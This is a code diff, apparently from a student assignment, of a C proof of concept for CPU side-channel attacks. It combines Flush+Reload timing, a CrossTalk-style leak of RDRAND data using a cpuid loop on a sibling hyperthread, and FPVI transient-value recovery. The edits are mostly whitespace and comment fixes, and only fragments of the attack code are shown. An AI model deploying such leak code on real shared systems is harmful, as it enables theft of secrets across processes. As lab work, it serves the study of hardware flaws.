@@ -6,9 +6,9 @@
 #include <sys/mman.h>
 #include <sys/wait.h>
 #include <string.h>
-#include <x86intrin.h>   
+#include <x86intrin.h>
 #include <stdbool.h>
-#include "asm.h"        
+#include "asm.h"
 
 #define NUM_SAMPLES 10000
 #define NUM_ITERATIONS 10
@@ -17,20 +17,20 @@
 #define STRIDE 4096
 #define FPVI_STRIDE 2048
 #define POSSIBLE_BYTES 256
-#define BYTES_TO_LEAK 8               
+#define BYTES_TO_LEAK 8
 #define RDRAND_OFFSET 32
 #define RDRAND_TO_LEAK 6
 
 
 static uint8_t *leak;
-static uint8_t *crosstalk_reloadbuffer;                     
+static uint8_t *crosstalk_reloadbuffer;
 static uint64_t CACHE_THRESHOLD;
 
 
 
 uint64_t measure_access(unsigned char* addr, int is_miss) {
     uint64_t min_time = UINT64_MAX;
-    
+
     for(int i = 0; i < ROUNDS; i++) {
         if(is_miss) {
             clflush(addr);
@@ -38,18 +38,18 @@ uint64_t measure_access(unsigned char* addr, int is_miss) {
             *(volatile char*)addr; 
         }
         mfence();
-        
+
         uint64_t start = rdtscp();
         *(volatile char*)addr;
         lfence();
         uint64_t end = rdtscp();
-        
+
         uint64_t delta_t = end - start;
         if(delta_t < min_time) {
             min_time = delta_t;
         }
     }
-    
+
     return min_time;
 }
 
@@ -57,8 +57,8 @@ uint64_t measure_access(unsigned char* addr, int is_miss) {
 
 uint64_t get_cache_threshold(){
 
-    uint64_t hits = 0;    
-    uint64_t misses = 0;   
+    uint64_t hits = 0;
+    uint64_t misses = 0;
     uint64_t delta_t;
 
     unsigned char test_line[64];
@@ -85,7 +85,7 @@ uint64_t get_cache_threshold(){
     uint64_t hitt_avg = hits / NUM_SAMPLES;
     uint64_t miss_avg = misses / NUM_SAMPLES;
     uint64_t threshold = (miss_avg + hitt_avg) / 2;
- 
+
     return threshold;
 }
 
@@ -96,7 +96,7 @@ uint64_t get_reload_time(unsigned char *addr) {
     *(volatile char*)addr;
     lfence();
     uint64_t end = rdtscp();
-    
+
     uint64_t delta_t = end - start;
 
     return delta_t;
@@ -109,7 +109,7 @@ void reload_and_measure(unsigned char *crosstalk_reloadbuffer, size_t *cache_hit
         *(volatile char*)(&crosstalk_reloadbuffer[j * FPVI_STRIDE]);
         lfence();
         uint64_t end = rdtscp();
-        
+
         uint64_t reload_time = end - start;
         if(reload_time < threshold) {
             cache_hits[j]++;
@@ -127,15 +127,15 @@ int main(void) {
 
     printf("Cache threshold: %lu\n", CACHE_THRESHOLD);
 
-    // so they can run on the twohyperthreads of the attackerâ€™s physical core
-    //child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
+    // so they can run on the two hyperthreads of the attacker's physical core
+    // child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
     pid_t pid = fork();
 
     // child CPID loop
     if (pid == 0) {
-        
+
         while(1) {
-            cpuid();  //not sure if it's the corerct assembly from asm.h it was there from asg 1, might need changes not sure yet         
+            cpuid();  //not sure if it's the corerct assembly from asm.h it was there from asg 1, might need changes not sure yet
         }
         _exit(0);
     }
@@ -260,9 +260,9 @@ int main(void) {
 
                 // 2. FPVI 
                 asm volatile(
-                    ".rept 2                    \n\t" 
-                    "  movq  %[x], %%xmm0       \n\t"  
-                    "  movq  %[y], %%xmm1       \n\t"  
+                    ".rept 2                    \n\t"
+                    "  movq  %[x], %%xmm0       \n\t"
+                    "  movq  %[y], %%xmm1       \n\t"
                     "  divsd %%xmm1, %%xmm0     \n\t"
                     ".endr                      \n\t"
                     "movq %%xmm0, %%rax         \n\t"
@@ -279,7 +279,7 @@ int main(void) {
                     [shift]"r"(nibble_index * 4)
                     : "rax","rcx","xmm0","xmm1","memory"
                 );
-    
+
                 // 3. Reload and measure
                 reload_and_measure(fpvi_reloadbuffer, cache_hits, CACHE_THRESHOLD);
             }
@@ -287,8 +287,8 @@ int main(void) {
             // extract the 4 bit architectural nibble with index nibble_index
             uint8_t architectural_nibble = (architectural_result >> (nibble_index * 4)) & 0xf;
             uint8_t transient_nibble = architectural_nibble;
-            
-            
+
+
             //get the most hit that is not the architectural one 
             for(int j = 0; j < 16; j++) { // exclude the correct cache hit we are not interested in teh architectural one
                 if(cache_hits[j] > 5 && j != architectural_nibble) {
@@ -296,7 +296,7 @@ int main(void) {
                     break;
                 }
             }
-            
+
             //to reconstruct the transient result
             transient_result |= ((uint64_t)transient_nibble) << (nibble_index * 4);
         }
@@ -313,6 +313,6 @@ int main(void) {
 
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
-    // puts("crosstalk done");
+
     return 0;
 }
